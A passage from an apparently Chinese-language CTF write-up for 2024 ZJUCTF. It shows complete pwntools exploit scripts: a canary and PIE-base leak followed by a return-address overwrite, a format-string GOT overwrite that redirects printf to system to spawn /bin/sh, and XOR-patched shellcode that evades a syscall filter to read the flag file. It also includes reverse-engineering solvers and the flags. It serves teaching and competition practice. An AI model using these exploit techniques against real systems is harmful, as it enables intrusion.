class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(answer)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">info(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 4: leak base_addr</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">277</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">277</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(answer)</span><br><span class="line">p.recvline()</span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2150</span></span><br><span class="line">info(<span class="string">f&quot;base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 5: overflow to jump to $rebase(0x0000000000001F9F)</span></span><br><span class="line">puts_addr = <span class="number">0x1F9F</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">285</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">285</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">puts_addr = base_addr + puts_addr</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;submit&#x27;</span>, <span class="string">b&#x27;=&#x27;</span>*(<span class="number">264</span>-<span class="built_in">len</span>(<span class="string">&#x27;submit&#x27;</span>)), canary, <span class="number">0</span>, puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, payload)</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;submit your score&#x27;, &quot;submit&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>得到flag: <code>ZJUCTF&#123;3veRY_7h1n9_1s_UNdEr_Y0uR_c0n7r0l!!&#125;</code></p>
<h4 id="simple-echo"><a href="#simple-echo" class="headerlink" title="simple echo"></a>simple echo</h4><p>checksec查看保护机制：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/brownie/ctf/matches/2024 ZJUCTF/pwn/simple-echo-attachment/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida查看，发现存在格式化字符串漏洞和栈溢出漏洞</p>
<ul>
<li>首先可以通过格式化字符串漏洞获取libc基址</li>
<li>然后通过格式化字符串漏洞将rop链写入返回地址</li>
</ul>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./app&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0000000000401351&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">39667</span>)</span><br><span class="line"><span class="comment"># 泄漏libc地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;%27$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Dididi, I am a simple echo server!&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Blala:0x&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改printf got地址</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./app&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x00000000001d8698</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x000000000002a3e5</span>+libc_addr</span><br><span class="line">low = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line">high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">info(<span class="string">f&#x27;system_addr: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> low &lt; high:</span><br><span class="line">    payload = flat(<span class="string">f&#x27;%<span class="subst">&#123;low-<span class="number">6</span>&#125;</span>c%12$hn%<span class="subst">&#123;high-low&#125;</span>c%13$hn&#x27;</span>.ljust(<span class="number">0x20</span>-<span class="number">6</span>), printf_got, printf_got+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = flat(<span class="string">f&#x27;%<span class="subst">&#123;high-<span class="number">6</span>&#125;</span>c%12$hn%<span class="subst">&#123;low-high&#125;</span>c%13$hn&#x27;</span>.ljust(<span class="number">0x20</span>-<span class="number">6</span>), printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;; /bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag: <code>ZJUCTF&#123;f0rMAt_5TR1Ng_bU9_iS_O1D_8uT_c001|0335&#125;</code></p>
<h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>禁用了execve系统调用，并且不允许syscall（<code>\x0f\x05</code>）字节出现，同时还没有给出flag的文件名。</p>
<ol>
<li>通过先传入<code>\x0f\x03</code>，然后将其与<code>\x06</code>异或即可得到syscall。</li>
<li>通过<code>getdents64</code>系统调用获取到目标flag文件名</li>
<li>通过<code>orw</code>获取flag内容</li>
</ol>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x00000000000014BF)&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">36007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     .section .shellcode,&quot;awx&quot;</span></span><br><span class="line"><span class="comment">#     .global _start</span></span><br><span class="line"><span class="comment">#     .global __start</span></span><br><span class="line"><span class="comment">#     _start:</span></span><br><span class="line"><span class="comment">#     __start:</span></span><br><span class="line"><span class="comment">#     .intel_syntax noprefix</span></span><br><span class="line"><span class="comment">#     .p2align 0</span></span><br><span class="line"><span class="comment">#         /* open(file=&#x27;/&#x27;, oflag=0, mode=0) */</span></span><br><span class="line"><span class="comment">#         /* push b&#x27;/\x00&#x27; */</span></span><br><span class="line"><span class="comment">#         push rdx</span></span><br><span class="line"><span class="comment">#         push 0x2f</span></span><br><span class="line"><span class="comment">#         mov rdi, rsp</span></span><br><span class="line"><span class="comment">#         xor edx, edx /* 0 */</span></span><br><span class="line"><span class="comment">#         xor esi, esi /* 0 */</span></span><br><span class="line"><span class="comment">#         /* call open() */</span></span><br><span class="line"><span class="comment">#         push 2 /* 2 */</span></span><br><span class="line"><span class="comment">#         pop rax</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rdx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rdx+0x1e], 0x6</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;) + b&quot;\x0f\x03&quot; + asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         /* getdents64(fd=&#x27;rax&#x27;, dirp=&#x27;rsp&#x27;, count=0x1000) */</span></span><br><span class="line"><span class="comment">#         mov rdi, rax</span></span><br><span class="line"><span class="comment">#         xor edx, edx</span></span><br><span class="line"><span class="comment">#         mov dh, 0x1000 &gt;&gt; 8</span></span><br><span class="line"><span class="comment">#         mov rsi, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         add rsi, 0x100</span></span><br><span class="line"><span class="comment">#         /* call getdents64() */</span></span><br><span class="line"><span class="comment">#         xor eax, eax</span></span><br><span class="line"><span class="comment">#         mov al, 217 /* 0xd9 */</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rcx+0x46], 0x6</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;) + b&quot;\x0f\x03&quot; + asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         /* write(fd=1, buf=&#x27;rsp&#x27;, n=0x1000) */</span></span><br><span class="line"><span class="comment">#         push 1</span></span><br><span class="line"><span class="comment">#         pop rdi</span></span><br><span class="line"><span class="comment">#         xor edx, edx</span></span><br><span class="line"><span class="comment">#         mov dh, 0x1000 &gt;&gt; 8</span></span><br><span class="line"><span class="comment">#         mov rsi, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         add rsi, 0x100</span></span><br><span class="line"><span class="comment">#         /* call write() */</span></span><br><span class="line"><span class="comment">#         push 1 /* 1 */</span></span><br><span class="line"><span class="comment">#         pop rax</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rcx+0x6d], 0x6</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;) + b&quot;\x0f\x03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># de27cb9335d01bb7576f00a72c13239d</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    .section .shellcode,&quot;awx&quot;</span></span><br><span class="line"><span class="string">    .global _start</span></span><br><span class="line"><span class="string">    .global __start</span></span><br><span class="line"><span class="string">    _start:</span></span><br><span class="line"><span class="string">    __start:</span></span><br><span class="line"><span class="string">    .intel_syntax noprefix</span></span><br><span class="line"><span class="string">    .p2align 0</span></span><br><span class="line"><span class="string">        /* open(file=&#x27;/de27cb9335d01bb7576f00a72c13239d&#x27;, oflag=0, mode=0) */</span></span><br><span class="line"><span class="string">        /* push b&#x27;/de27cb9335d01bb7576f00a72c13239d\x00&#x27; */</span></span><br><span class="line"><span class="string">        push rdx</span></span><br><span class="line"><span class="string">        push 0x64</span></span><br><span class="line"><span class="string">        mov rax, 0x3933323331633237</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x6130306636373537</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x6262313064353333</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x396263373265642f</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">        xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">        /* call open() */</span></span><br><span class="line"><span class="string">        push 2 /* 2 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x4a], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span> + asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x100) */</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor eax, eax /* SYS_read */</span></span><br><span class="line"><span class="string">        xor edx, edx</span></span><br><span class="line"><span class="string">        mov dh, 0x100 &gt;&gt; 8</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x68], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span> + asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* write(fd=0, buf=&#x27;rsp&#x27;, n=&#x27;rax&#x27;) */</span></span><br><span class="line"><span class="string">        mov rdi, 1 /* 0 */</span></span><br><span class="line"><span class="string">        mov rdx, rax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* call write() */</span></span><br><span class="line"><span class="string">        push 1 /* 1 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x8d], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag内容：<code>ZJUCTF&#123;M45ter_of_O_R_W&#125;</code></p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="rev-beginner-1"><a href="#rev-beginner-1" class="headerlink" title="rev beginner 1"></a>rev beginner 1</h3><p>基础逆向题：</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rev1&#x27;</span>)</span><br><span class="line">temp = <span class="string">b&#x27;\x5a\x4b\x57\x46&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x58\x4b\x81\x79&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x6d\x7f\x69\x74&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7f\x6c\x74\x84&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7e\x70\x84\x7c&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7b\x7d\x8a\x56\x95&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> temp:</span><br><span class="line">    result += p8(t - i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">info(<span class="string">f&quot;result: <span class="subst">&#123;result.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">p.sendline(result)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag: <code>ZJUCTF&#123;rev_is_fun_right?&#125;</code></p>
<h4 id="rev-beginner-2"><a href="#rev-beginner-2" class="headerlink" title="rev beginner 2"></a>rev beginner 2</h4><p>基础逆向题，通过模拟das指令进行逐字符爆破，得到flag</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rev2&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *$rebase(0x00001336)&#x27;</span>)</span><br><span class="line">v12 = <span class="string">b&#x27;\x3c\x1e\x23\x30&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x52\x0d\x4d\x79&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x42\x3d\x4f\xdb&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\xff\xb3\x2f\x00&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x1f\x3e\x32\x4f&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x52\x3e\xa3\xa4\x21\x8f&#x27;</span></span><br><span class="line"></span><br><span class="line">v14 = <span class="string">b&#x27;\x75\x82\x9b\xd1&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xf6\xbb\xa6\x36&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xac\xe8\xb1\x7f&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xb0\x67\xb8\x19&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xb6\x3f\x38\x07&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\x2e\xbd\x83\x52\xf5\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">b&#x27;\x8d\xa8\xcd\xe4&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xf8\xee\xce\xce&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xcf\x11\xbf\x6e&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xb8\xb9\x50\x4b&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xbe\x6d\x6b\x28&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x41\xeb\xf3\xb3\xf5\x87&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">das_simulation</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="comment"># 假设 a 和 b 都是16位的BCD值（输入为整数）</span></span><br><span class="line">    <span class="comment"># 只考虑AL寄存器，即最低8位的操作</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将两个数减法</span></span><br><span class="line">    result = a - b</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取出低8位，模拟 AL 寄存器的效果</span></span><br><span class="line">    al = result &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="comment"># info(al)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 CF 和 AF 标志</span></span><br><span class="line">    cf = <span class="number">0</span></span><br><span class="line">    af = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 AF（低4位超过9或者有借位时需要调整）</span></span><br><span class="line">    <span class="keyword">if</span> (al &amp; <span class="number">0x0F</span>) &gt; <span class="number">9</span> <span class="keyword">or</span> ((a &amp; <span class="number">0x0F</span>) &lt; (b &amp; <span class="number">0x0F</span>)):</span><br><span class="line">        al = (al - <span class="number">6</span>) &amp; <span class="number">0xFF</span>  <span class="comment"># 修正低四位</span></span><br><span class="line">        af = <span class="number">1</span>  <span class="comment"># 设置 AF 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 CF（高4位超过9或者有借位时需要调整）</span></span><br><span class="line">    <span class="keyword">if</span> (al &amp; <span class="number">0xF0</span>) &gt; <span class="number">0x90</span> <span class="keyword">or</span> result &lt; <span class="number">0</span>:</span><br><span class="line">        al = (al - <span class="number">0x60</span>) &amp; <span class="number">0xFF</span>  <span class="comment"># 修正高四位</span></span><br><span class="line">        cf = <span class="number">1</span>  <span class="comment"># 设置 CF 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> al, cf, af</span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    info(<span class="string">f&#x27;i : <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        al, cf, af = das_simulation(guess, v12[i])</span><br><span class="line">        <span class="comment"># info(f&#x27;al: &#123;hex(al)&#125;, cf: &#123;cf&#125;, af: &#123;af&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">if</span> (al + v14[i])&amp;<span class="number">0xff</span> == temp[i]:</span><br><span class="line">            info(<span class="string">f&quot;guess: <span class="subst">&#123;<span class="built_in">hex</span>(guess)&#125;</span> is correct&quot;</span>)</span><br><span class="line">            result += p8(guess)</span><br><span class="line">            info(<span class="string">f&quot;result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> guess == <span class="number">255</span>:</span><br><span class="line">        result += <span class="string">b&#x27;*&#x27;</span></span><br><span class="line">p.sendline(result)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag：<code>ZJUCTF&#123;welc0me-2-reverse!&#125;</code></p>
<h4 id="中-A-口算"><a href="#中-A-口算" class="headerlink" title="中 A 口算"></a>中 A 口算</h4><p>其种子为2010年同一时间，因此可以预测所有的题目。</p>
<img src="/posts/dc126860/image-20241022212702474.png" class="" title="image-20241022212702474">

